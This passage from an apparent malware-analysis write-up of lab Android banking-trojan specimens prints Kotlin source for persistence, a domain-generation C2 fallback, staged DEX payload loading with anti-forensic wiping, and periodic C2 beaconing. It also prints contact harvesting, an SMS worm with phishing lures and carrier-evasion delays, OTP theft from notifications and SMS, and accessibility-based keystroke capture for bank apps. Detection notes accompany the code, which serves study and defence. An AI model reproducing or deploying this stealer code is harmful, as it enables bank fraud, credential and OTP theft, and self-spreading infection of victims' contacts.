ContentProvider.onCreate() fires during class loading, before Application.onCreate(). Banker exploits this to (1) decode all XOR/AES-encoded string constants into a memory cache before any other code runs, and (2) evaluate the environment gate so that if Frida/debugger/emulator is detected, the entire stealer initialization path can be short-circuited in Application.onCreate(). The no-op CRUD methods are the analyst tell -- a ContentProvider that provides no data has no legitimate purpose. Takopii's own `LabActivationProvider` uses the identical pattern defensively.

**StealthFgService.kt -- Foreground Service Process-Keep-Alive**

```kotlin
// File: overlay-banker/.../stealer/StealthFgService.kt (actual specimen code)

class StealthFgService : Service() {

    companion object {
        fun start(context: Context) {
            // (1) Android 8+ requires startForegroundService() for FG launch
            val intent = Intent(context, StealthFgService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        // (2) LOW priority notification — barely visible in shade
        val notification = NotificationCompat.Builder(this, "doc_sync")
            .setContentTitle("Doc Reader Lite")
            .setContentText("Syncing documents...")      // Camouflage text
            .setSmallIcon(android.R.drawable.ic_menu_save)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)                             // Cannot be swiped away
            .build()
        startForeground(1001, notification)
    }

    // (3) START_STICKY: system restarts if killed by memory pressure
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
}
```

Process-priority elevation via foreground service. Android's Doze and process lifecycle manager kills background processes aggressively; foreground services survive. The LOW priority notification channel means the persistent notification is minimized in the shade -- user sees "Syncing documents..." if they expand notifications, matching the DocReader Lite camouflage identity. `START_STICKY` ensures the system relaunches the service after OOM kill. Called from `BankerA11yService.onServiceConnected()` -- as soon as Accessibility is granted, the FG service starts, making the malware process nearly unkillable.

**BootReceiver.kt -- Boot Persistence**

```kotlin
// File: overlay-banker/.../stealer/BootReceiver.kt (actual specimen code)

class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        // (1) Dual-trigger: boot AND package replacement
        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
            intent.action == Intent.ACTION_MY_PACKAGE_REPLACED) {
            // (2) Restart stealth service -> re-arms entire stealer chain
            StealthFgService.start(context)
        }
    }
}
```

Two persistence paths: `BOOT_COMPLETED` fires on device restart, `MY_PACKAGE_REPLACED` fires on app update (prevents self-deactivation when malware receives a silent update via dropper). Starting `StealthFgService` transitively re-arms the entire kill chain because the FG service's lifecycle is tied to `BankerA11yService`, which in turn registers with C2 and starts polling. The 21 lines are the entire boot persistence layer -- minimal surface, maximum survivability.

**Network:**
- `Dga.kt` — MD5+Calendar DGA (SharkBot V2.8 algorithm)
- `ModularLoader.kt` — 4-stage Anatsa payload architecture
- `UpdateChannel.kt` — config fetch + target list + kill switch

### Network Layer — Deep Source Analysis

**Dga.kt — SharkBot V2.8 Domain Generation**

```kotlin
// File: overlay-banker/.../network/Dga.kt (actual specimen code)

object Dga {

    private val TLDS = listOf(".xyz", ".live", ".com", ".store", ".info", ".top", ".net")

    // (1) Deterministic DGA: seed = TLD + weekNumber + year → MD5 → first 16 hex
    fun generate(
        weekNumber: Int = Calendar.getInstance().get(Calendar.WEEK_OF_YEAR),
        year: Int = Calendar.getInstance().get(Calendar.YEAR),
    ): List<String> {
        return TLDS.map { tld ->
            val seed = "$tld$weekNumber$year"
            val hash = md5(seed).take(16)
            "$hash$tld"  // e.g., "a1b2c3d4e5f6g7h8.xyz"
        }
    }

    // (2) Defender pre-computation: generate next N weeks of candidates
    fun generateRange(weeks: Int): List<Pair<Int, List<String>>> {
        return (0 until weeks).map { offset ->
            val normalizedWeek = /* calendar math */
            normalizedWeek to generate(normalizedWeek, year)
        }
    }

    // (3) Fallback chain: primary → secondary → DGA candidates
    fun resolveC2(primaryHost: String, secondaryHost: String? = null): String {
        if (isReachable(primaryHost)) return primaryHost
        if (secondaryHost != null && isReachable(secondaryHost)) return secondaryHost
        for (domain in generate()) {
            if (isReachable(domain)) return domain
        }
        return primaryHost  // all failed — retry next cycle
    }
}
```

7 TLDs x 52 weeks = 364 domains/year, all precomputable by defenders who know the algorithm. The `generateRange()` method is explicitly provided for defender use -- sinkhole the upcoming week's candidates before they activate. The fallback chain (hardcoded primary → secondary → DGA) mirrors real SharkBot V2.8 exactly (research/06). Lab safety: all DGA output maps to loopback. Real banker: resolves to bulletproof hosting.

**ModularLoader.kt — Anatsa 4-Stage Payload Architecture**

```kotlin
// File: overlay-banker/.../network/ModularLoader.kt (actual specimen code)

object ModularLoader {

    private val CONFIG_KEY = byteArrayOf(/* "ModLoaderKey!!!!" — 16 bytes */)

    // (1) Stage 1: Fetch XOR-encrypted config from C2
    private fun stage1FetchConfig(baseUrl: String): StageResult {
        val req = Request.Builder().url("$baseUrl/api/v1/config")
            .header("X-Client-Version", "2.1.4").build()
        val body = client.newCall(req).execute().body?.bytes()
        val json = JSONObject(String(xorDecrypt(body)))
        return StageResult(1, true, data = json)
    }

    // (2) Stage 2: Download DEX, write to internal storage
    private fun stage2DownloadDex(context: Context, url: String): StageResult {
        val bytes = client.newCall(Request.Builder().url(url).build()).execute().body?.bytes()
        val dexBytes = xorDecrypt(bytes)
        val dexFile = File(context.filesDir, "update_${System.currentTimeMillis()}.jar")
        dexFile.writeBytes(dexBytes)
        return StageResult(2, true, data = dexFile.absolutePath)
    }

    // (3) Stage 3: DexClassLoader + reflective dispatch
    private fun stage3LoadAndInvoke(context: Context, dexPath: String, config: JSONObject): StageResult {
        val classLoader = DexClassLoader(dexPath, optimizedDir.absolutePath, null, context.classLoader)
        val entryClass = config.optString("entry_class", "com.module.Payload")
        val clazz = classLoader.loadClass(entryClass)
        val method = clazz.getDeclaredMethod(config.optString("entry_method", "init"), Context::class.java)
        method.isAccessible = true
        method.invoke(null, context)
        return StageResult(3, true, data = entryClass)
    }

    // (4) Stage 4: Anti-forensics — overwrite with zeros + delete
    private fun stage4Cleanup(dexPath: String) {
        val file = File(dexPath)
        file.outputStream().use { out -> out.write(ByteArray(file.length().toInt())); out.flush() }
        file.delete()
    }
}
```

Four distinct network round-trips + four decode steps. Sandbox that times out before stage 3 misses the entire payload. The zero-overwrite before deletion prevents file-carving recovery -- disk forensics finds nothing. Memory carving or Frida hook on DexClassLoader.<init> is required to capture the DEX. The `X-Client-Version` header in stage 1 identifies the dropper version to C2, enabling campaign-wide version targeting. Config JSON controls entry class + method name, allowing mid-campaign payload pivots without rebuilding the dropper.

**WorkManagerBeacon.kt — 15-Minute C2 Keepalive**

```kotlin
// File: overlay-banker/.../network/WorkManagerBeacon.kt (actual specimen code)

object WorkManagerBeacon {

    // (1) Schedule at platform minimum — 15 minutes (Anatsa-identical)
    fun schedule(context: Context) {
        val request = PeriodicWorkRequestBuilder<BeaconWorker>(15, TimeUnit.MINUTES)
            .setConstraints(Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED).build())
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "com.docreader.lite.sync", ExistingPeriodicWorkPolicy.KEEP, request)
    }

    // (2) Each firing: re-check environment, flush exfil, heartbeat
    class BeaconWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
        override suspend fun doWork(): Result {
            val safe = EnvironmentGate.recheck(applicationContext)
            if (!safe) return Result.success()  // hostile → silent exit, no retry
            Exfil.flush()
            C2.registerBot(applicationContext)   // re-register = heartbeat
            return Result.success()
        }
    }
}
```

WorkManager survives Doze mode (Android 6+) and force-stop (with BOOT_COMPLETED re-schedule). The `KEEP` policy prevents duplicate scheduling. Every beacon cycle re-checks the environment gate -- if analyst attaches Frida mid-session, the next 15-minute cycle detects it and goes silent (returns `Result.success()` without retry, so no backoff noise). The CONNECTED constraint ensures beacons only fire when network is available, avoiding failed request noise in logcat. Detection: `dumpsys jobscheduler` for periodic jobs with INTERVAL_DURATION=900000ms paired with same-destination POST within 60s of firing.

**UpdateChannel.kt — Mid-Campaign Config Rotation**

```kotlin
// File: overlay-banker/.../network/UpdateChannel.kt (actual specimen code)

object UpdateChannel {

    @Volatile var currentVersion = 0
    @Volatile var currentC2Host = "10.0.2.2"
    @Volatile var currentC2Port = 8080

    data class UpdateConfig(
        val version: Int, val newC2Host: String?, val newC2Port: Int?,
        val newTargets: List<TargetUpdate>?, val newPayloadUrl: String?,
        val killBotIds: List<String>?,
    )

    // (1) Poll: GET /api/v1/update?v=N — only process if server version > current
    private suspend fun checkForUpdate(baseUrl: String) {
        val req = Request.Builder().url("$baseUrl/api/v1/update?v=$currentVersion")
            .header("X-Bot-Id", android.os.Build.MODEL).build()
        val json = JSONObject(client.newCall(req).execute().body?.string())
        if (json.optInt("version", 0) <= currentVersion) return
        applyUpdate(json)
    }

    // (2) Apply: 5 update fields — C2 rotation, target list, payload URL, kill switch
    private fun applyUpdate(json: JSONObject) {
        val newHost = json.optString("c2_host", "")
        if (newHost.isNotEmpty()) currentC2Host = newHost          // C2 domain rotation
        val newPort = json.optInt("c2_port", 0)
        if (newPort > 0) currentC2Port = newPort

        json.optJSONArray("targets")?.let { /* parse + callback */ } // New banking app targets
        json.optString("payload_url", "")?.let { /* trigger DEX update */ }

        // Kill switch: if this bot's ID is in the kill list → self-destruct
        json.optJSONArray("kill_bot_ids")?.let { killList ->
            val myId = Build.MODEL + "_" + Build.SERIAL
            if (myId in (0 until killList.length()).map { killList.getString(it) }) {
                onKillSwitch?.invoke()
            }
        }
    }
}
```

Campaign-wide broadcast channel, distinct from per-bot command polling. Five update fields give the operator full fleet control: (1) C2 domain rotation when old domain is flagged, (2) new target banking apps added mid-campaign, (3) new payload URL for DEX updates with bug fixes, (4) kill switch for specific bot IDs (compromised devices, law enforcement honeypots), (5) version gating ensures each update applies only once. The `X-Bot-Id` header enables per-device targeting. Polling cadence matches WorkManagerBeacon (15 min). Detection: periodic GET to same path with incrementing `v=` parameter from non-foregrounded app.

**Spread:**
- `ContactHarvester.kt` — contact list enumeration
- `SmsWorm.kt` — SMS-based propagation

### Spread + OTP Service — Deep Source Analysis

**ContactHarvester.kt — Contact List Exfiltration**

```kotlin
// File: overlay-banker/.../spread/ContactHarvester.kt (actual specimen code)

object ContactHarvester {

    data class Contact(val name: String, val phone: String, val email: String?)

    // (1) Query ContactsContract for all contacts with phone numbers
    fun harvest(context: Context): List<Contact> {
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(Phone.DISPLAY_NAME, Phone.NUMBER),
            null, null, Phone.DISPLAY_NAME + " ASC"
        )
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(nameIdx) ?: continue
                val phone = it.getString(phoneIdx) ?: continue
                val normalized = phone.replace(Regex("[\\s\\-()]+"), "")
                if (normalized.length < 7) continue
                contacts.add(Contact(name, normalized, null))
            }
        }
        return contacts.distinctBy { it.phone }  // deduplicate by phone number
    }

    // (2) Exfil in chunks of 50 contacts per batch
    fun exfiltrate(context: Context) {
        harvest(context).chunked(50).forEach { chunk ->
            Exfil.event("contacts_harvested", "count" to chunk.size.toString(),
                "data" to chunk.joinToString("|") { "${it.name}:${it.phone}" }.take(500))
        }
    }
}
```

FluBot pattern: harvest → exfil → worm. Phone number normalization strips formatting (spaces, dashes, parentheses) for SMS delivery. Deduplication by normalized phone prevents sending duplicate worm SMS to the same contact. Chunked exfil (50/batch) avoids oversized payloads. Detection: `READ_CONTACTS` permission + batch ContactsContract query + subsequent network POST within 60s = contact harvest signal.

**SmsWorm.kt — FluBot Self-Spreading**

```kotlin
// File: overlay-banker/.../spread/SmsWorm.kt (actual specimen code)

object SmsWorm {

    private val LURE_TEMPLATES = listOf(
        "Hi {name}, your package delivery update: {url}",
        "{name}, you have a pending payment: {url}",
        "Security alert for {name}: verify your account: {url}",
        "{name}, someone shared photos with you: {url}",
    )

    // (1) Rate-limited spread: 1 SMS per 30-60 seconds (carrier evasion)
    fun spread(context: Context, url: String?, customTemplate: String?) {
        val contacts = ContactHarvester.harvest(context)
        scope.launch {
            for (contact in contacts) {
                val message = template
                    .replace("{name}", contact.name.split(" ").first())
                    .replace("{url}", spreadUrl)
                sendSms(contact.phone, message)
                delay(Random.nextLong(30_000, 60_001))  // 30-60s between sends
            }
        }
    }

    // (2) Dual send path: direct SmsManager → ReflectionHider fallback
    private fun sendSms(destination: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()
            val parts = smsManager.divideMessage(message)
            if (parts.size == 1) smsManager.sendTextMessage(destination, null, message, null, null)
            else smsManager.sendMultipartTextMessage(destination, null, parts, null, null)
        } catch (_: Exception) {
            ReflectionHider.sendSms(destination, message)  // Reflection fallback
        }
    }
}
```

FluBot (2021-2022) achieved exponential spread across Europe using package-tracking lures. Four personalized templates use the contact's first name for social engineering effectiveness. Rate limiting at 30-60 seconds between sends evades carrier burst-detection. The reflection fallback through `ReflectionHider.sendSms()` means static analysis shows no direct `SmsManager` import in the worm module. `divideMessage()` handles the SMS 160-char limit for long lure URLs. Detection: `SEND_SMS` permission + SMS to contacts list members + URL in SMS body.

**OtpNotifService.kt — NotificationListenerService OTP Capture**

```kotlin
// File: overlay-banker/.../OtpNotifService.kt (actual specimen code)

class OtpNotifService : NotificationListenerService() {

    // (1) Receives EVERY notification posted system-wide
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        val n = sbn.notification ?: return

        // (2) Extract all text fields from notification
        val title = n.extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = n.extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val bigText = n.extras?.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
        val ticker = n.tickerText?.toString() ?: ""

        // (3) OTP extraction from combined text
        val otp = OtpExtractor.extract("$title $text $bigText $ticker")
        if (otp != null) Exfil.otp("notif:$pkg", otp, pkg)

        // (4) Also capture full notification from SMS/messaging apps
        if (isSmsApp(pkg)) Exfil.credential(pkg, "notification_text", combined.take(500))
    }

    private fun isSmsApp(pkg: String): Boolean {
        return pkg.contains("messaging") || pkg.contains("mms") ||
                pkg.contains("sms") || pkg == "com.android.phone"
    }
}
```

Compact but powerful: 45 lines capture OTP codes from every notification system-wide. Four text fields exhaustively cover notification content (title, text, bigText, ticker). The SMS-app detection captures full notification text from messaging apps even when no OTP pattern matches -- operator may want the raw banking notification content for context. Combined with SmsInterceptor (SMS body) and AccessibilityEngine (A11y notification events), this forms triple-redundant OTP capture. Detection: `BIND_NOTIFICATION_LISTENER_SERVICE` on an app with no notification-management UI + A11y binding in same package = high-confidence banker.

### Component Count

```
Stealer core:          14 .kt files
Evasion layer:          7 .kt files
Frontier modules:      12 .kt files
Network layer:          4 .kt files
Persistence layer:      4 .kt files
Spread modules:         2 .kt files
                      -----
Total offensive:       43 .kt files
```

---

## 4. Stage-1-Evasion — SkyWeather Forecast

**Package:** `com.skyweather.forecast`
**APK Size:** 1.74 MB (1,741,865 bytes)
**VT Score:** 0/66
**SHA256:** `af5ceb94cb9d7bc9a37eacca1cf25b066761e24429bda7151d52378e69b01612`

### Kill Chain (5-Stage Capstone)

```
Stage 1 -- Evasion:
  intArrayOf XOR string obfuscation
  anti-debug (isDebuggerConnected + /proc/self/status + timing)
  DGA fallback (MD5+Calendar, SharkBot V2.8)
  DexClassLoader runtime payload loading

Stage 2 -- Credential Capture:
  AccessibilityService text extraction (ScreenReader)
  TYPE_ACCESSIBILITY_OVERLAY rendering (OverlayRenderer)
  Credential buffering (CredentialStore)

Stage 3 -- OTP Intercept:
  NotificationListenerService (NotificationEngine)
  SMS BroadcastReceiver priority 999 (SmsInterceptor)
  OTP regex + confidence scoring (OtpExtractor)

Stage 4 -- ATS (Automatic Transfer System):
  Screen reading + node traversal (ScreenReader)
  Command queue + state machine (AtsEngine)
  Synthetic tap/swipe with Herodotus jitter (GestureInjector)

Stage 5 -- Composition:
  WorkManager C2 beacon (SyncTask) -- 15-min periodic
  Config fetch + target list + kill switch (UpdateChannel)
  XOR decrypt + DexClassLoader + anti-forensics (PayloadManager)
  Cross-stage wiring validated by detection rules
```

### Core Offensive Modules (14)

| Module | Function | MITRE |
|---|---|---|
| `AppConfig.kt` | XOR-encoded endpoints + evasion gates | -- |
| `AccessibilityEngine.kt` | A11y event capture + overlay trigger + ATS dispatch | T1517 |
| `NotificationEngine.kt` | NLS OTP intercept | T1517 |
| `SmsInterceptor.kt` | SMS receiver + OTP extraction | T1582 |
| `CredentialStore.kt` | Credential buffer + JSON exfil format | T1417.002 |
| `SyncTask.kt` | WorkManager C2 beacon + periodic exfil | T1437 |
| `UpdateChannel.kt` | Config fetch + target list + kill switch | T1437 |
| `PayloadManager.kt` | XOR decrypt + DCL + anti-forensics | T1407 |
| `DomainResolver.kt` | MD5+Calendar DGA (7 TLDs/week) | T1437 |
| `AtsEngine.kt` | Command queue + state machine + form fill | T1626 |
| `ScreenReader.kt` | A11y node traversal + text extraction | T1517 |
| `OtpExtractor.kt` | Regex extraction + confidence scoring | T1517 |
| `OverlayRenderer.kt` | TYPE_ACCESSIBILITY_OVERLAY (2032) | T1626 |
| `GestureInjector.kt` | Synthetic tap/swipe + Herodotus jitter | T1626 |
| `DeviceProfile.kt` | Hardware-metric anti-sandbox (5 checks) + anti-debug (3 vectors) | T1633 |
| `RuntimeBridge.kt` | Reflective API resolution — PEB-walk Android equivalent | T1407 |

### Core Modules — Deep Source Analysis

**AccessibilityEngine.kt — Load-Bearing Banker Primitive (433 lines)**

```kotlin
// File: stage-1-evasion/.../core/AccessibilityEngine.kt (actual specimen code)

class AccessibilityEngine : AccessibilityService() {

    private var targetPackages: Set<String> = emptySet()  // C2-pushed target list
    private var currentForeground: String = ""
    private var isArmed = false

    // (1) Service connect: load targets, arm gates, init overlay + ATS
    override fun onServiceConnected() {
        loadTargetList()                          // SharedPrefs ← UpdateChannel ← C2
        isArmed = evaluateGates()                 // Dormancy + interaction + RFC1918
        if (isArmed) {
            overlayRenderer = OverlayRenderer(this)
            atsEngine = AtsEngine(this)
            loadAtsCommands()                     // SharedPrefs ← C2 config JSON
        }
    }

    // (2) Main dispatcher: 4 event types drive the attack
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || !isArmed) return
        if (!AppConfig.isEndpointSafe()) return   // Safety gate every event cycle
        when (event.eventType) {
            TYPE_WINDOW_STATE_CHANGED -> handleWindowChange(event)   // overlay trigger
            TYPE_VIEW_TEXT_CHANGED -> handleTextChange(event)        // credential capture
            TYPE_VIEW_FOCUSED -> handleFocusChange(event)           // field classification
            TYPE_NOTIFICATION_STATE_CHANGED -> handleNotification(event) // OTP intercept
        }
    }

    // (3) Foreground detection: target app opens → overlay fires + ATS arms
    private fun handleWindowChange(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        currentForeground = packageName
        if (isTargetPackage(packageName)) {
            overlayRenderer?.showOverlay(packageName)       // THE core banker attack
            atsEngine?.onTargetForegrounded(packageName)    // ATS queues if armed
        } else {
            overlayRenderer?.dismiss()
            atsEngine?.onTargetLostForeground()
        }
    }

    // (4) Keystroke capture: classify as pwd/usr/otp/txt by view ID heuristic
    private fun handleTextChange(event: AccessibilityEvent) {
        val eventType = when {
            isPasswordField(event, viewId) -> "pwd"    // password, pass, pwd, pin, secret
            isUsernameField(viewId) -> "usr"            // username, email, login, account, cpf
            isOtpField(viewId, text) -> "otp"           // 4-8 digit numeric in otp/code/token field
            else -> "txt"
        }
        CredentialStore.capture(CapturedEvent(packageName, viewId, text, timestamp, eventType))
    }

    // (5) Defense-in-depth: 4 gates must ALL pass
    private fun evaluateGates(): Boolean {
        val elapsed = System.currentTimeMillis() - PrefsManager.installTime
        if (elapsed < BuildConfig.DORMANCY_MS) return false          // Gate 1: dormancy
        if (PrefsManager.interactionCount < BuildConfig.INTERACTION_THRESHOLD) return false // Gate 2
        if (!AppConfig.isEndpointSafe()) return false                // Gate 3: RFC1918
        return true
    }
}
```

433 lines -- the largest single module across all specimens. Four event types exhaustively cover the banker attack surface from one entry point: window transitions trigger overlay + ATS, text changes capture credentials, focus changes pre-classify upcoming input, notification events capture OTP. The `evaluateGates()` defense-in-depth mirrors the EnvironmentGate pattern from overlay-banker but adds dormancy (delay after install to evade sandbox timeout) and interaction threshold (require N user interactions to confirm real device). Target packages loaded from SharedPreferences allow C2 to push ~400 banking app package names (Anatsa pattern). Every event cycle re-checks `AppConfig.isEndpointSafe()` -- RFC1918 validation on every single A11y callback.

**CredentialStore.kt — Thread-Safe In-Memory Buffer**

```kotlin
// File: stage-1-evasion/.../core/CredentialStore.kt (actual specimen code)

object CredentialStore {

    private const val MAX_ENTRIES = 50
    private val buffer = ConcurrentLinkedQueue<CapturedEvent>()

    data class CapturedEvent(
        val packageName: String, val viewId: String, val text: String,
        val timestamp: Long, val eventType: String
    )

    // (1) Capture: add event, trim oldest if over capacity
    fun capture(event: CapturedEvent) {
        if (!AppConfig.isEndpointSafe()) return  // Safety gate on every capture
        buffer.add(event)
        while (buffer.size > MAX_ENTRIES) { buffer.poll() }
    }

    // (2) Drain: return all + clear — atomic for exfil
    fun drain(): List<CapturedEvent> {
        val events = mutableListOf<CapturedEvent>()
        while (true) { val event = buffer.poll() ?: break; events.add(event) }
        return events
    }

    // (3) Non-destructive peek — ATS needs latest OTP without draining
    fun peekAll(): List<CapturedEvent> = buffer.toList()

    // (4) Manual JSON builder — no Gson/Moshi dependency (smaller APK, less ML signal)
    fun toJsonPayload(): ByteArray {
        val events = drain()
        val json = StringBuilder(events.size * 128)
        json.append("{\"c\":[")
        events.forEachIndexed { index, event ->
            if (index > 0) json.append(',')
            json.append("{\"p\":\"").append(escapeJson(event.packageName)).append("\",")
            json.append("\"v\":\"").append(escapeJson(event.viewId)).append("\",")
            json.append("\"x\":\"").append(escapeJson(event.text)).append("\",")
            json.append("\"t\":").append(event.timestamp).append(",")
            json.append("\"e\":\"").append(event.eventType).append("\"}")
        }
        json.append("]}")
        return json.toString().toByteArray(Charsets.UTF_8)
    }
}
```

ConcurrentLinkedQueue bridges the A11y main thread (capture) and WorkManager background thread (exfil) without locks. Max 50 entries prevents unbounded memory growth -- newest data is most valuable, oldest drops. The `peekAll()` method is the Stage 3→4 bridge: ATS engine reads the latest OTP code without draining the buffer that SyncTask needs for exfil. Manual JSON construction with single-char keys (`p`, `v`, `x`, `t`, `e`) avoids Gson/Moshi dependency -- no JSON library import in the DEX means one less ML signal. Memory-only storage (no disk persistence) is anti-forensics: Anatsa V4 buffers credentials identically, disk forensics finds nothing.

**NotificationEngine.kt — NLS OTP Intercept with Confidence Scoring**

```kotlin
// File: stage-1-evasion/.../core/NotificationEngine.kt (actual specimen code)

class NotificationEngine : NotificationListenerService() {

    private var isArmed = false

    override fun onListenerConnected() {
        isArmed = AppConfig.isEndpointSafe()
    }

    // (1) Receives EVERY notification system-wide — 50-200 per day on active device
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null || !isArmed) return
        if (sbn.packageName == applicationContext.packageName) return  // skip self

        // (2) Extract 5 text fields exhaustively
        val textParts = mutableListOf<String>()
        extras.getCharSequence("android.title")?.let { textParts.add(it.toString()) }
        extras.getCharSequence("android.text")?.let { textParts.add(it.toString()) }
        extras.getCharSequence("android.bigText")?.let { textParts.add(it.toString()) }
        extras.getCharSequence("android.subText")?.let { textParts.add(it.toString()) }
        notification.tickerText?.let { textParts.add(it.toString()) }

        // (3) OTP extraction with confidence scoring
        val otp = OtpExtractor.extract(textParts.joinToString(" ")) ?: return

        CredentialStore.capture(CapturedEvent(packageName, "notification_${otp.confidence.name.lowercase()}",
            otp.code, System.currentTimeMillis(), "otp_nls"))

        // (4) HIGH confidence: also capture full notification text for C2 context
        if (otp.confidence == OtpExtractor.Confidence.HIGH) {
            CredentialStore.capture(CapturedEvent(packageName, "notification_context",
                fullText.take(200), System.currentTimeMillis(), "nls_ctx"))
        }

        // (5) URGENT exfil: OTP codes expire in 30-120 seconds
        SyncTask.scheduleUrgent(applicationContext)
    }
}
```

Five text fields capture every possible notification content location. The confidence-gated context capture (HIGH only) keeps the buffer small -- only 1-5 OTP-bearing notifications per day during active banking. The self-skip check (`packageName == applicationContext.packageName`) prevents feedback loops. URGENT exfil scheduling via `SyncTask.scheduleUrgent()` uses REPLACE policy + 1s delay (vs standard 5s KEEP) because OTP validity is typically 30-120 seconds -- the faster the exfil, the more likely the code is still valid when ATS auto-fills it.

**SmsInterceptor.kt — Priority-999 SMS Receiver**

```kotlin
// File: stage-1-evasion/.../core/SmsInterceptor.kt (actual specimen code)

class SmsInterceptor : BroadcastReceiver() {

    // Registered in manifest with android:priority="999" (maximum)
    // Fires BEFORE the default SMS app

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        if (!AppConfig.isEndpointSafe()) return

        // (1) Parse multi-part SMS from intent
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        val senderAddress = messages[0].originatingAddress ?: "unknown"
        val fullBody = messages.joinToString("") { it.messageBody ?: "" }

        // (2) OTP extraction with multi-match support
        val otpResults = OtpExtractor.extractAll(fullBody)

        if (otpResults.isEmpty()) {
            // (3) No OTP found — still capture raw SMS from banking senders
            CredentialStore.capture(CapturedEvent("sms:$senderAddress", "sms_body",
                fullBody.take(200), System.currentTimeMillis(), "sms_raw"))
            return
        }

        // (4) OTP found — capture each match + full SMS body for context
        for (otp in otpResults) {
            CredentialStore.capture(CapturedEvent("sms:$senderAddress",
                "sms_otp_${otp.confidence.name.lowercase()}", otp.code,
                System.currentTimeMillis(), "otp_sms"))
        }
        CredentialStore.capture(CapturedEvent("sms:$senderAddress", "sms_context",
            fullBody.take(200), System.currentTimeMillis(), "sms_ctx"))

        // (5) URGENT exfil — OTP codes expire fast
        SyncTask.scheduleUrgent(context.applicationContext)
    }
}
```

Manifest priority 999 means this receiver fires before the default SMS app. Multi-part SMS concatenation handles messages split across multiple PDUs. `extractAll()` (vs `extract()`) captures multiple OTP codes if present in a single SMS (rare but possible). Even when no OTP pattern matches, raw SMS from banking senders is captured -- real banker maintains a list of bank SMS short-codes. The `sms:` prefix on packageName enables C2-side filtering by capture source (SMS vs NLS vs A11y). Detection: `intent-filter priority="999"` on `SMS_RECEIVED` is a well-known banker indicator -- some ML models key on this directly.

**ScreenReader.kt — ATS Visual Engine (241 lines)**

```kotlin
// File: stage-1-evasion/.../core/ScreenReader.kt (actual specimen code)

object ScreenReader {

    data class TextNode(val viewId: String, val text: String, val description: String,
        val isEditable: Boolean, val isClickable: Boolean, val className: String)

    // (1) Find node by view ID pattern — per-bank view ID maps from C2
    fun findNodeById(root: AccessibilityNodeInfo?, idPattern: String): AccessibilityNodeInfo? {
        if (root == null) return null
        val id = root.viewIdResourceName
        if (id != null && id.contains(idPattern, ignoreCase = true)) return root
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val found = findNodeById(child, idPattern)
            if (found != null) { if (found !== child) child.recycle(); return found }
            child.recycle()
        }
        return null
    }

    // (2) Find node by text — screen-state detection: "Transfer", "Confirm", "PIN"
    fun findNodeByText(root: AccessibilityNodeInfo?, textPattern: String): AccessibilityNodeInfo? {
        // Checks both node.text AND node.contentDescription (buttons use this)
        // Recursive DFS with child recycle discipline
    }

    // (3) Extract ALL visible text — ATS "eyes" for screen-state identification
    fun extractAllText(root: AccessibilityNodeInfo?): List<TextNode> {
        val results = mutableListOf<TextNode>()
        collectText(root, results, depth = 0)  // depth guard at 20
        return results
    }

    // (4) Screen-state matcher: ANY pattern found = screen matches
    fun screenContainsAny(root: AccessibilityNodeInfo?, patterns: List<String>): Boolean {
        val allText = extractAllText(root)
        val combined = allText.joinToString(" ") { "${it.text} ${it.description}" }.lowercase()
        return patterns.any { combined.contains(it.lowercase()) }
    }

    // (5) Find editable fields — input targets for ACTION_SET_TEXT
    fun findEditableNodes(root: AccessibilityNodeInfo?): List<AccessibilityNodeInfo>
    // (6) Find clickable nodes — button enumeration for ATS
    fun findClickableNodes(root: AccessibilityNodeInfo?): List<AccessibilityNodeInfo>
}
```

The ATS engine's "eyes" -- before injecting any gesture, the engine must see what is on screen. Six traversal functions cover the ATS workflow: `findNodeById` for C2-pushed view ID maps (real SharkBot maintains per-bank ID tables), `findNodeByText` for screen-state detection in multiple languages ("Transferencia" PT, "Uberweisen" DE), `extractAllText` for full screen dump to C2 operator panel, `screenContainsAny` for ATS `wait_screen` commands, `findEditableNodes` for form field targeting, `findClickableNodes` for button enumeration. The depth guard at 20 prevents infinite recursion on circular view hierarchies. The `TextNode` data class captures editability and clickability metadata that ATS uses for action planning.

**OtpExtractor.kt — 3-Pass Confidence-Scored Extraction**

```kotlin
// File: stage-1-evasion/.../core/OtpExtractor.kt (actual specimen code)

object OtpExtractor {

    private val OTP_PATTERN = Regex("\\b(\\d{4,8})\\b")

    // 17 context keywords increase confidence
    private val OTP_CONTEXT_KEYWORDS = setOf(
        "code", "otp", "pin", "verify", "verification", "confirm", "token",
        "password", "passcode", "authentication", "security", "login", "sign",
        "transfer", "transaction", "approve"
    )

    enum class Confidence { HIGH, MEDIUM, LOW }

    // (1) 3-pass extraction with confidence scoring
    fun extract(text: String): ExtractionResult? {
        val matches = OTP_PATTERN.findAll(text).toList()
        if (matches.isEmpty()) return null

        // Pass 1: digits near context keywords within 30 chars → HIGH
        for (match in matches) {
            val nearbyText = getNearbyText(text.lowercase(), match.range, 30)
            if (OTP_CONTEXT_KEYWORDS.any { nearbyText.contains(it) })
                return ExtractionResult(match.groupValues[1], Confidence.HIGH, text.take(100))
        }

